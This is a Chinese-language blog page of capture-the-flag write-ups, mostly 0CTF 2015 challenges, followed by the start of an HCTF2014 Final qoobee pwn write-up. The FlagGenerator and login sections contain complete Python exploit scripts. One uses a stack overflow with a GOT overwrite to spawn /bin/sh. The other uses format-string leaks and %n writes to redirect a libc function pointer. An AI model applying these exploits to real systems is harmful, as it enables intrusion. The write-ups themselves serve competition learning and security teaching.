<p>感觉应该是坐标点，加上题目x-y-z。猜测把点全部描出来会不会看到立体的flag。。。于是matlab画散点图（电脑不好真惨，把点去掉一部分画还是卡）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A=[</span><br><span class="line">......</span><br><span class="line">];</span><br><span class="line">x=A(:,1);y=A(:,2);z=A(:,3);</span><br><span class="line">scatter3(x,y,z,&apos;.&apos;)</span><br></pre></td></tr></table></figure></p>
<p>慢慢的旋转猜出flag</p>
<h1 id="geo-newbie"><a href="#geo-newbie" class="headerlink" title="geo newbie"></a>geo newbie</h1><p>我的地理知识涨了不少</p>
<blockquote>
<p>Talentyange gives lots of tedious apks and you know how bad he is now. Let’s try some interesting geography knowledge. nc 202.112.26.111 29995 / nc 202.112.28.118 29995</p>
</blockquote>
<p>上去以后问你xxx是哪里的，用国家2字母简称表达。 前20轮给国家，21-70给地名，70-75问你河流或者山脉经过的国家。。。 前70用google map的geocoding api 后70轮用google+维基百科手动输入+自动缓存</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">correct = &#123;</span><br><span class="line"><span class="string">'Palestine, State of'</span> : <span class="string">'PS'</span>,</span><br><span class="line"><span class="string">'Norfolk Island'</span>:<span class="string">'NF'</span>,</span><br><span class="line"><span class="string">'Alexandria'</span>:<span class="string">'EG'</span>,</span><br><span class="line"><span class="string">'Antarctica'</span>:<span class="string">'AQ'</span>,</span><br><span class="line"><span class="string">'Micronesia'</span>:<span class="string">'FM'</span>,</span><br><span class="line"><span class="string">'Naples'</span>:<span class="string">'IT'</span>,</span><br><span class="line"><span class="string">'Mount Olympus'</span>:<span class="string">'GR'</span>,</span><br><span class="line"><span class="string">'Hyde Park'</span>:<span class="string">'GB'</span>,</span><br><span class="line"><span class="string">'Georgia'</span>:<span class="string">'GE'</span>,</span><br><span class="line"><span class="string">'Micronesia (Federated States of)'</span>:<span class="string">'FM'</span>,</span><br><span class="line"><span class="string">'Korea (Republic of)'</span>:<span class="string">'KR'</span>,</span><br><span class="line"><span class="string">'Holy See'</span>:<span class="string">'VA'</span>,</span><br><span class="line"><span class="string">'Tanzania, United Republic of'</span>:<span class="string">'TZ'</span>,</span><br><span class="line"><span class="string">'Macedonia (the former Yugoslav Republic of)'</span>:<span class="string">'MK'</span>,</span><br><span class="line"><span class="string">'Volga'</span>:<span class="string">'RU'</span>,</span><br><span class="line"><span class="string">'Lego'</span>:<span class="string">'DK'</span>,</span><br><span class="line"><span class="string">'Virgin Islands (British)'</span>:<span class="string">'VG'</span>,</span><br><span class="line"><span class="string">'Rickshaw capital of the world'</span>:<span class="string">'BD'</span>,</span><br><span class="line"><span class="string">'Melbourne'</span>:<span class="string">'AU'</span>,</span><br><span class="line"><span class="string">'Vancouver'</span>:<span class="string">'CA'</span>,</span><br><span class="line"><span class="string">'Korea (Democratic People'</span>s Republic of)<span class="string">':'</span>KP<span class="string">',</span></span><br><span class="line"><span class="string">'</span>Jiuzhaigou Valley<span class="string">':'</span>CN<span class="string">',</span></span><br><span class="line"><span class="string">'</span>Georgia<span class="string">':'</span>GE<span class="string">',</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">target = (('</span><span class="number">202.112</span><span class="number">.28</span><span class="number">.118</span><span class="string">',29995))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def geo(query):</span></span><br><span class="line">url = 'http://maps.googleapis.com/maps/api/geocode/json?address=%s&amp;sensor=true_or_false' % query</span><br><span class="line">r = requests.get(url)</span><br><span class="line">result = json.loads(r.text)</span><br><span class="line"><span class="comment"># print result</span></span><br><span class="line"><span class="keyword">for</span> com <span class="keyword">in</span> result[<span class="string">'results'</span>][<span class="number">0</span>][<span class="string">'address_components'</span>]:</span><br><span class="line"><span class="keyword">if</span> <span class="string">"country"</span> <span class="keyword">in</span> com[<span class="string">'types'</span>]:</span><br><span class="line"><span class="keyword">return</span> com[<span class="string">'short_name'</span>]</span><br><span class="line"></span><br><span class="line">io = zio(target, timeout=<span class="number">100000</span>,</span><br><span class="line">print_read=COLORED(REPR,<span class="string">'red'</span>),</span><br><span class="line">print_write=COLORED(REPR,<span class="string">'green'</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># level 1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">70</span>):</span><br><span class="line">buf = io.read_until(<span class="string">':'</span>)</span><br><span class="line">country_name = re.findall(<span class="string">r'n(.+)?:'</span>, buf)[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># print country_name</span></span><br><span class="line"><span class="comment"># country = pycountry.countries.get(name=country_name)</span></span><br><span class="line"><span class="comment"># io.writeline(country_ascii2_dict[country_name])</span></span><br><span class="line"><span class="keyword">if</span> country_name <span class="keyword">in</span> correct:</span><br><span class="line">io.writeline(correct[country_name])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io.writeline(geo(country_name))</span><br><span class="line"></span><br><span class="line"><span class="comment"># load</span></span><br><span class="line">level2 = &#123;&#125;</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'level2'</span>) <span class="keyword">as</span> f:</span><br><span class="line">level2 = json.loads(f.read())</span><br><span class="line"></span><br><span class="line">buf = io.read_until(<span class="string">':'</span>)</span><br><span class="line"><span class="comment"># level 2</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">question = re.findall(<span class="string">r'n(.+)?:'</span>, buf)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">if</span> question <span class="keyword">in</span> level2:</span><br><span class="line">ans = level2[question]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">ans = raw_input()</span><br><span class="line">ans = ans.strip().split(<span class="string">','</span>)</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> ans:</span><br><span class="line"><span class="keyword">if</span> c <span class="keyword">in</span> correct:</span><br><span class="line">io.writeline(correct[c])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io.writeline(geo(c))</span><br><span class="line">buf = io.read_until(<span class="string">':'</span>)</span><br><span class="line">level2[question] = ans</span><br><span class="line"><span class="keyword">except</span> Exception, e:</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'level2'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(json.dumps(level2))</span><br><span class="line"><span class="keyword">print</span> e</span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'level2'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(json.dumps(level2))</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
<p>flag:<strong>0CTF{eNj0y_geography_l0v3_7hE_w0lRd}</strong></p>
<h1 id="peers"><a href="#peers" class="headerlink" title="peers"></a>peers</h1><blockquote>
<p>peers :P 一个pcap文件</p>
</blockquote>
<p>打开发现是bt传输文件的流量。搜索下发现与<a href="http://eindbazen.net/2012/05/plaid-ctf-2012-torrent/" target="_blank" rel="noopener">Plaid CTF 2012 – Torrent</a>类似。 不过有个坑，就是用到80端口，wireshark把它认成了HTTP请求，影响了服务解析。只要把enable service里HTTP给去掉就好了。</p>
<blockquote>
<p>PS. 朋友圈看到有人把那个分片的传输数据剪出来拼起来了。给各位大神跪了。。。  <a href="http://yuf4n.net/wp-content/uploads/2015/03/peerliang.jpg" target="_blank" rel="noopener"><img src="http://yuf4n.net/wp-content/uploads/2015/03/peerliang.jpg" alt="peerliang"></a></p>
</blockquote>
<h1 id="FlagGenerator"><a href="#FlagGenerator" class="headerlink" title="FlagGenerator"></a>FlagGenerator</h1><blockquote>
<p>Can you generate the correct flag? flagen libc.so.6 202.112.26.106:5149 202.112.28.115:5149 Notice: Ubuntu 14.04.2 LTS</p>
</blockquote>
<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><pre><code>RELRO STACK CANARY NX PIE RPATH RUNPATH FILE
Partial RELRO Canary found NX enabled No PIE No RPATH No RUNPATH flagen
</code></pre><p>这个是个花式flag生成器。问题出再fun4，把字符转成数字例如把’a’转成’4’，就比如yufan变成yuf4n(其实是用户名已注册…)。其中把h变化为’1-1’。一个字符变3个字符就栈溢出了。。。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>利用那个扩展在输入里填一些hhh就能造成溢出。就是有个canary。</p>
<pre><code>strcpy(dest, &amp;src);
return *MK_FP(__GS__, 20) ^ v18;
</code></pre><p>注意在之后有一个从栈里src考数据到分配的对指针dest的调用。dest是函数传进来的，栈溢出的时候可以改到。 利用步骤</p>
<ol>
<li>利用那个strcpy将GOT中check_stack_fail函数地址改掉绕过stack smash check，顺带将system地址覆盖GOT中atoi。(简单粗暴地爆破system地址)</li>
<li>栈溢出将eip控制到sub_804873E，直接利用atoi调用system(‘/bin/sh’)获得shell</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">checkfail_got = <span class="number">0x0804B01C</span></span><br><span class="line">brute_system = <span class="number">0xf75de190</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># target = ('./flagen')</span></span><br><span class="line">target = ((<span class="string">'202.112.28.115'</span>, <span class="number">5149</span>))</span><br><span class="line"></span><br><span class="line">copyto = <span class="string">''</span></span><br><span class="line">copyto += l32(brute_system)*<span class="number">10</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">''</span></span><br><span class="line">p += l32(ret)</span><br><span class="line">p += copyto</span><br><span class="line">p += <span class="string">'a'</span>*(<span class="number">48</span> -len(copyto)<span class="number">-4</span>)</span><br><span class="line">p += <span class="string">'h'</span> * <span class="number">40</span> + <span class="string">'a'</span>*<span class="number">100</span></span><br><span class="line"></span><br><span class="line">p += l32(checkfail_got + <span class="number">4</span>) <span class="comment">#ebp</span></span><br><span class="line">p += l32(<span class="number">0x804873E</span>) <span class="comment"># eip</span></span><br><span class="line">p += l32(checkfail_got) <span class="comment"># dest</span></span><br><span class="line"></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">print</span> cnt</span><br><span class="line">cnt += <span class="number">1</span></span><br><span class="line">io = zio(target, timeout=<span class="number">100000</span>,</span><br><span class="line">print_read=COLORED(REPR,<span class="string">'red'</span>),</span><br><span class="line">print_write=COLORED(REPR,<span class="string">'green'</span>)</span><br><span class="line">)</span><br><span class="line">io.writeline(<span class="string">'1'</span>)</span><br><span class="line">io.writeline(p)</span><br><span class="line"><span class="comment"># io.gdb_hint()</span></span><br><span class="line">io.writeline(<span class="string">'4'</span>)</span><br><span class="line">io.writeline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
<p>flag:<strong>0ctf{delicious_stack_cookie_generates_flag}</strong></p>
<h1 id="login"><a href="#login" class="headerlink" title="login"></a>login</h1><blockquote>
<p>Login as guest. Logout as root. libc.so.6 202.112.26.107:10910 202.112.28.116:10910</p>
</blockquote>
<blockquote>
</blockquote>
<blockquote>
<p>Notice: Ubuntu 14.04.2 LTS The process is protected by a sandbox. So you may not get a shell. The only thing you can do is reading the “flag”. If you want to break the sandbox, turn to task “0ops APP”.</p>
</blockquote>
<h2 id="漏洞发现-1"><a href="#漏洞发现-1" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><pre><code>RELRO STACK CANARY NX PIE RPATH RUNPATH FILE
Full RELRO Canary found NX enabled PIE enabled No RPATH No RUNPATH login
</code></pre><p>利用guest，guest123登陆。用户名用一个全局buffer存储，最后一位有个标志为初始设置成0。 之后可以通过fun2修改用户，而且可以修改到标志位。 然后可以用fun4<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">void __noreturn fun4_sub_103B()</span><br><span class="line">&#123;</span><br><span class="line">__int64 v0; // rax@1</span><br><span class="line">__int64 strpt; // rsi@1</span><br><span class="line">__int64 v2; // rax@4</span><br><span class="line">__int64 v3; // rsi@4</span><br><span class="line">char v4; // [sp+0h] [bp-220h]@1</span><br><span class="line">char czUser; // [sp+10h] [bp-210h]@1</span><br><span class="line">char czPassword; // [sp+110h] [bp-110h]@1</span><br><span class="line">__int64 v7; // [sp+218h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">v7 = *MK_FP(__FS__, 40LL);</span><br><span class="line">printf(&quot;Login: &quot;);</span><br><span class="line">safe_read_sub_CB5((__int64)&amp;czUser, 256);</span><br><span class="line">printf(&quot;Password: &quot;, 256LL);</span><br><span class="line">safe_read_sub_CB5((__int64)&amp;czPassword, 256);</span><br><span class="line">v0 = strlen(&amp;czPassword);</span><br><span class="line">MD5((__int64)&amp;czPassword, v0, (__int64)&amp;v4);</span><br><span class="line">strpt = (__int64)&quot;root&quot;;</span><br><span class="line">if ( !strcmp(&amp;czUser, &quot;root&quot;) )</span><br><span class="line">&#123;</span><br><span class="line">strpt = (__int64)&quot;0ops&#123;secret_MD5&#125;&quot;;</span><br><span class="line">if ( !memcmp(&amp;v4, &quot;0ops&#123;secret_MD5&#125;&quot;, 16uLL) )</span><br><span class="line">showflag_sub_FB3();</span><br><span class="line">&#125;</span><br><span class="line">printf(&amp;czUser, strpt); // formatstring attack</span><br><span class="line">puts(&quot; login failed.&quot;);</span><br><span class="line">puts(&quot;1 chance remaining.&quot;);</span><br><span class="line">printf(&quot;Login: &quot;);</span><br><span class="line">safe_read_sub_CB5((__int64)&amp;czUser, 256);</span><br><span class="line">printf(&quot;Password: &quot;, 256LL);</span><br><span class="line">safe_read_sub_CB5((__int64)&amp;czPassword, 256);</span><br><span class="line">v2 = strlen(&amp;czPassword);</span><br><span class="line">MD5((__int64)&amp;czPassword, v2, (__int64)&amp;v4);</span><br><span class="line">v3 = (__int64)&quot;root&quot;;</span><br><span class="line">if ( !strcmp(&amp;czUser, &quot;root&quot;) )</span><br><span class="line">&#123;</span><br><span class="line">v3 = (__int64)&quot;0ops&#123;secret_MD5&#125;&quot;;</span><br><span class="line">if ( !memcmp(&amp;v4, &quot;0ops&#123;secret_MD5&#125;&quot;, 0x10uLL) )</span><br><span class="line">showflag_sub_FB3();</span><br><span class="line">&#125;</span><br><span class="line">printf(&amp;czUser, v3);</span><br><span class="line">puts(&quot; login failed.&quot;);</span><br><span class="line">puts(&quot;Threat detected. System shutdown.&quot;);</span><br><span class="line">exit(1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>存在格式化字符串攻击</p>
<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>程序可以调用两次format string之后就调用exit(1)退出了。并且Full RELRO，所以可能的方法就是修改到libc加载的函数指针。提供方便的是程序里有打印flag的函数。 首先，通过调试发现寄存器里存在地址相关的信息，可以通过%016lx打印出来，栈相关的地址信息也有。程序加载的基址可以得到。栈里buffer的内容可以自己控制。通过读GOT表也能算出libc加载的基址和相对偏移。 要先写个程序把libc的相对偏移算出来。</p>
<blockquote>
<p>这边做的时候SB了看有提示ubuntu 14.04.2正好系统一样，就通过程序加载的地址直接算libc的基址，可能服务器有沙箱加载地址有变化结果本地可以远程一直不行……</p>
</blockquote>
<p>之后使用printf就通过%n修改libc的函数指针，之后就等flag了……</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">dist_text_libcbasew = <span class="number">0x13acd000</span> - <span class="number">0x3be000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># target = ('./login')</span></span><br><span class="line">target = ((<span class="string">'202.112.26.107'</span>,<span class="number">10910</span>))</span><br><span class="line"></span><br><span class="line">io = zio(target, timeout=<span class="number">100000</span>,</span><br><span class="line">print_read=COLORED(REPR,<span class="string">'red'</span>),</span><br><span class="line">print_write=COLORED(REPR,<span class="string">'green'</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">io.writeline(<span class="string">'guest'</span>)</span><br><span class="line">io.writeline(<span class="string">'guest123'</span>)</span><br><span class="line">io.read_until(<span class="string">'Your choice:'</span>)</span><br><span class="line">io.writeline(<span class="string">'2'</span>)</span><br><span class="line">io.writeline(<span class="string">'a'</span>*<span class="number">256</span>)</span><br><span class="line">io.read_until(<span class="string">'Your choice:'</span>)</span><br><span class="line">io.writeline(<span class="string">'4'</span>)</span><br><span class="line">io.writeline(<span class="string">'%016lx%016lx%016lx'</span>)</span><br><span class="line">io.read_until(<span class="string">'Password: '</span>)</span><br><span class="line">io.gdb_hint()</span><br><span class="line">io.writeline(<span class="string">'1234'</span>)</span><br><span class="line"></span><br><span class="line">baddr = io.read(<span class="number">16</span>*<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">textbase = int(baddr[:<span class="number">16</span>],<span class="number">16</span>)</span><br><span class="line">textbase = textbase<span class="number">-0x1490</span></span><br><span class="line">retaddr = textbase - dist_text_libcbasew + <span class="number">0x38</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gen p</span></span><br><span class="line">sum = <span class="number">0</span></span><br><span class="line">p = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">t = (fun &gt;&gt; i*<span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">t = <span class="number">0x100</span> * i + t - sum</span><br><span class="line">sum += t</span><br><span class="line">p += <span class="string">'%0'</span></span><br><span class="line">p += str(t)</span><br><span class="line">p += <span class="string">'x'</span></span><br><span class="line">p += <span class="string">'%'</span></span><br><span class="line">p += <span class="string">'%d'</span> % (<span class="number">40</span> + i)</span><br><span class="line">p += <span class="string">'$n'</span></span><br><span class="line"></span><br><span class="line">p2 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">p2 += l64(retaddr+i)</span><br><span class="line"></span><br><span class="line">io.writeline(p)</span><br><span class="line">io.read_until(<span class="string">'Password: '</span>)</span><br><span class="line">io.writeline(p2)</span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">'0ctf'</span>)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
<p>flag:<strong>0ctf{login_success_and_welcome_back}</strong></p>

                    
                        


                    
                    
                        <p>
                            <a
                                href="/writeups/0ctf-2015-writeup/#post-footer"
                                class="postShorten-excerpt_link link"
                                aria-label=""
                            >
                                Comment and share
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title">
                    
                        <a
                            class="link-unstyled"
                            href="/writeups/hctf2014final-qoobee-writeup/"
                            aria-label=": HCTF2014 FINAL 之pwn题qoobee1-6 writeup"
                        >
                            HCTF2014 FINAL 之pwn题qoobee1-6 writeup
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time datetime="2015-01-11T21:16:34+08:00">
	
		    Jan 11, 2015
    	
    </time>
    
        <span>in </span>
        
    <a class="category-link" href="/categories/writeups/">writeups</a>


    
</div>

            </div>
            
                <div class="postShorten-content">
                    <p>整理题目的时候把HCTF2014 FINAL的qoobee全部做了一遍。 做的时候没有顺序，利用代码也没好好写。。。超级乱。。。看者见谅。。。</p>
<h1 id="Qoobee"><a href="#Qoobee" class="headerlink" title="Qoobee"></a>Qoobee</h1><h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><p>其实程序还隐藏了一个-214号功能</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> \_\_cdecl fun214\_sub_80495A9()</span><br><span class="line">&#123;</span><br><span class="line">  FILE *v0; <span class="comment">// ST34_4@7</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@8</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// \[sp+Bh\] \[bp-1Dh\]@3</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// \[sp+Ch\] \[bp-1Ch\]@1</span></span><br><span class="line">  <span class="keyword">void</span> *haystack; <span class="comment">// \[sp+18h\] \[bp-10h\]@1</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  haystack = mmap((<span class="keyword">void</span> *)<span class="number">0x80000000</span>, <span class="number">0x1000</span>u, <span class="number">7</span>, <span class="number">50</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Oh! You can leave a message for author(the real QooBee) here: "</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">150</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v2 = getchar();</span><br><span class="line">    <span class="keyword">if</span> ( (\*\_\_ctype\_b\_loc())\[v2\] &amp; <span class="number">0x400</span> || (\*\_\_ctype\_b\_loc())\[v2\] &amp; <span class="number">0x800</span> )</span><br><span class="line">      *((_BYTE *)haystack + v3++) = v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( sub_8048CD0(v2) );</span><br><span class="line">  v0 = fopen(<span class="string">"/tmp/qoobee/message_log"</span>, <span class="string">"a+"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(v0, <span class="string">"%sn"</span>, haystack);</span><br><span class="line">  fclose(v0);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)haystack, <span class="string">"ymkelwin"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = ((<span class="keyword">int</span> (*)(<span class="keyword">void</span>))haystack)();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Received: %sn"</span>, haystack);</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"Thank you!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以执行代码，需要构造全ascii的shellcode，字符串里要含有ymkelwin(yinmo kelwin?LEOC和kelwin不能说的秘密?)</p>
